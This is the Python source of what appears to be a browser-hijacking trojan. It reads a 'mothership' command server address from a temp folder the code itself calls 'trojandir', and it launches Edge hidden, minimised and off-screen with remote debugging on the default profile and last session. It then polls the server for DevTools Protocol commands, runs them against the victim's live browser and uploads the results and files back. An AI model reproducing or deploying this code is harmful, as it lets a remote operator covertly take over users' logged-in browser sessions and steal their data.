# https://onecompiler.com/python/44me4y8rn

# clear ; & "E:\__Binaries\Portable Python-3.10.5 x64\App\Python\python.exe" test.py
# "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" 
# --profile-directory=Default --remote-debugging-port=9222 --remote-allow-origins=* --restore-last-session
# chrome.exe --remote-debugging-port=9222 --remote-allow-origins=* --profile-directory=Default --restore-last-session
# use 9223 for chrome, 9222 for msedge

# python -m pip install psutil

# curl -s http://localhost:9222/json/list | findstr webSocketDebuggerUrl | findstr ws://

import traceback
import psutil
import inspect
import time
import sys
import websocket
import json
import requests
import tempfile
import os
from pathlib import Path
from datetime import datetime
import random
from urllib.parse import quote

def isempty(instr):
    return not (instr and instr.strip())

def gettimestamp():
    now = datetime.now()
    timestamp = now.strftime('%Y%m%d%H%M%S%f')[:-3]

    return timestamp

def getexceptionobj(exp):
    expstrdict = {
        "msg": str(exp),
        "tech_msg": repr(exp),
        "full_trace": traceback.format_exc()
    }
    
    return expstrdict
    
def logexception(exp):
    if ( not exp ):
        return
        
    expstrdict = getexceptionobj()

    logmsg(json.dumps(expstrdict))

def logmsg(msgstr):
    print(msgstr)

    if( logf ):
        logf.write(f"{msgstr}\r\n")
        logf.flush()  

def get_clientid():
    clientid_file = os.path.join(trojandir, 'client_id')
    tclientid=""

    with open(clientid_file, 'r') as f:
        tclientid = f.read().strip()

    return tclientid

def get_mothership():
    tmothershipfpath = os.path.join(trojandir, 'mothership')
    tmothership=""

    with open(tmothershipfpath, 'r') as f:
        tmothership = f.read().strip()

    return tmothership

def connect_client(tclientid):
    try:
        url = f"{mothership}/ow/relay.php?action=connectclient&clientid={tclientid}"
        response = requests.get(url)
        
        #{ "SessionID": "67363438" }
        
        if ( response ):
            if ( not isempty(response.text) ):
                logmsg(f"response.text: {response.text}")
                
                obj_dict = json.loads(response.text)
            
                if obj_dict and "SessionID" in obj_dict:
                    return obj_dict["SessionID"]
            else:
                logmsg("error: response.text is empty")
                return None
        else:
            logmsg("error: response is null")
            return None
    except Exception as exp:
        logexception(exp)
        return None
        
def send_rpc_command(url, command, log=True):
    result = None
    try:
        logmsg("sending to: "+url)
        # Create WebSocket connection
        ws = websocket.create_connection(url)
        logmsg("Connected...")

        # Send command
        ws.send(json.dumps(command))
        logmsg(f"Sent: {json.dumps(command)}")

        # Receive response
        result = ws.recv()

        if ( log ):
            logmsg(f"Received response: {result}")
        else:
            logmsg(f"Received response")

        # Close connection
        ws.close()
    except Exception as e:
        logmsg(f"Error: {e}")

    return result 

def upload_file(filepath):
    logmsg(f"uploading file: {filepath}".replace("\\", "\\\\"))

    fpath = Path(filepath).resolve()
    fname = Path(filepath).name

    url = f"{mothership}/ow/upload.php?"
    url += f"batchid={batchid}"
    url += f"&filename={fname}"
    url += f"&clientid={clientid}"
    url += f"&source={source}"
    url += f"&sessionid={sessionid}"
    with open(fpath, 'rb') as f:
        response = requests.post(url, data=f)

    return response

def upload_txt(txtstr, fname):
    ts = gettimestamp()
    fpath = os.path.join(scriptdir_full_path, fname)

    with open(fpath, 'w', encoding='utf-8') as f:
        f.write(txtstr)

    if ( os.path.exists(fpath) ):
        upload_file(fpath)

def clientgetnextmessage():
    logmsg("starting: " + inspect.currentframe().f_code.co_name)

    url = f"{mothership}/ow/relay.php?"
    url += "action=clientgetnextmessage"
    url += f"&sessionid={relaysessionid}&clientid={clientid}"
    
    response = requests.get(url)
    logmsg("response.status_code: " + str(response.status_code))  # e.g., 200 for success

    logmsg(inspect.currentframe().f_code.co_name + ": " +response.text)

    if "TRY_AGAIN" in response.text:
        return response.text

    obj_dict = json.loads(response.text)

    return obj_dict

def clientpushmessage(payload, messageid):
    
    if not payload:
        return None
    
    msgstr = json.dumps(payload)

    url = f"{mothership}/ow/relay.php?"
    url += f"action=clientpushmessage"
    url += f"&clientid={clientid}&sessionid={relaysessionid}&messageid={messageid}"
    
    response = requests.post(url, data=msgstr.encode('utf-8'), headers={'Content-Type': 'application/json'})

    return response

def wait_clientgetnextmessage(secs=1):
    result = None
    while True:
        result = clientgetnextmessage()
        msg_str = ""
        if ( isinstance(result, str) ):
            msg_str = result.strip()

            if ( msg_str== "TRY_AGAIN" ):
                result = None
                logmsg(inspect.currentframe().f_code.co_name + " sleeping")
                time.sleep(secs)
        else:
            break

    return result

def exec_builtin(tcmdname):
    
    if ( isempty(tcmdname) ):
        return None
    
    tcmdname = tcmdname.lower()

    if ( tcmdname == "start_msedge" ):
        try:
            result = start_msedge()
        except Exception as exp:
            logexception(exp)
            result = None
    elif ( tcmdname == "get_targets_list"):
        try:
            result = get_targets_list()
        except Exception as exp:
            logexception(exp)
            result = None

    result = { "result": result }

    return json.dumps(result)

def client_loop():
    logmsg("starting "+inspect.currentframe().f_code.co_name)

    message_obj = wait_clientgetnextmessage()
    messageid = message_obj["MessageID"]
    payload =   message_obj["JSON"]
    
    builtincmd = ""
    
    if ( "builtincmd" in message_obj ):
        builtincmd = message_obj["builtincmd"]
        if ( not isempty(builtincmd) ):
            result = exec_builtin(builtincmd)
    else:
        ws_url = payload["ws_url"]
        payload = payload["payload"]

        logmsg(f"ws_url: {ws_url}")
        logmsg(f"payload: {payload}")

        if ( ws_url == "ws_url" ):
            ws_url = relay_ws_url

        result = send_rpc_command(ws_url, payload,True)
    
    if ( result ):
        data_dict = json.loads(result)
        result = data_dict["result"]
        
        if ( result == {} ):
            result = { "isvoid": True }

        if ( not result ):
            result = { "iserror": True }
            
        result = clientpushmessage(result, messageid)

def get_relay_ws_url():
    try:
        response = requests.get("http://localhost:9222/json/version")
        
        if ( response ):
            logmsg("response.status_code: " + str(response.status_code))  # e.g., 200 for success
            data_dict = response.json()
            trelay_ws_url = data_dict["webSocketDebuggerUrl"]
            logmsg(f"relay_ws_url: {trelay_ws_url}")
        else:
            return None
            
        return trelay_ws_url
    except Exception as exp:
        logexception(exp)
        return None

def get_targets_list(port=9222):
    response = requests.get("http://localhost:"+str(port)+"/json/list")
    targets_list = response.json()
    return targets_list

def start_msedge():
    cmdlineargs = '--new-window "https://www.google.com/" --profile-directory=Default --remote-debugging-port=9222 --remote-allow-origins=* --restore-last-session --window-position=1000,1000 --window-size=50,50'
    os.system("start /min msedge " + cmdlineargs)

### 

timestamp = gettimestamp()
script_full_path = Path(__file__).resolve()
script_fname = Path(__file__).name
source = script_fname
scriptdir_full_path = script_full_path.parent

temp_dir = tempfile.gettempdir()
trojandir = os.path.join(temp_dir, "owd") 

logfname=script_fname + "_" + timestamp + ".log"
logfpath = os.path.join(scriptdir_full_path, logfname)
logf = open(logfpath, 'w', encoding='utf-8')

sessionid = random.randint(10000000, 99999999)
batchid = sessionid
clientid = get_clientid()

mothership = get_mothership()

if ( isempty(mothership) ):
    logmsg("could not set mothership -- exiting")
    sys.exit(1)

if ( isempty(clientid) ):
    logmsg("could not set clientid -- exiting")
    sys.exit(1)

relaysessionid = connect_client(clientid)

logmsg(f"relaysessionid: {relaysessionid}")

if ( isempty(relaysessionid) ):
    logmsg("could not set relaysessionid -- exiting")
    sys.exit(1)

relay_ws_url=get_relay_ws_url()

if ( isempty(relay_ws_url) ):
    logmsg("could not set relay_ws_url -- exiting")
    sys.exit(1)

###

logmsg(f"starting script {script_fname} client {clientid}  sessionid {sessionid} batchid {batchid} -- {timestamp}")

if __name__ == "__main__":
    while True:
        try:
            logmsg("starting relay loop " + gettimestamp())
            
            client_loop()

            logmsg("relay loop sleeping " + gettimestamp())
            
            time.sleep(1)  

        except Exception as exp:
            logexception(exp)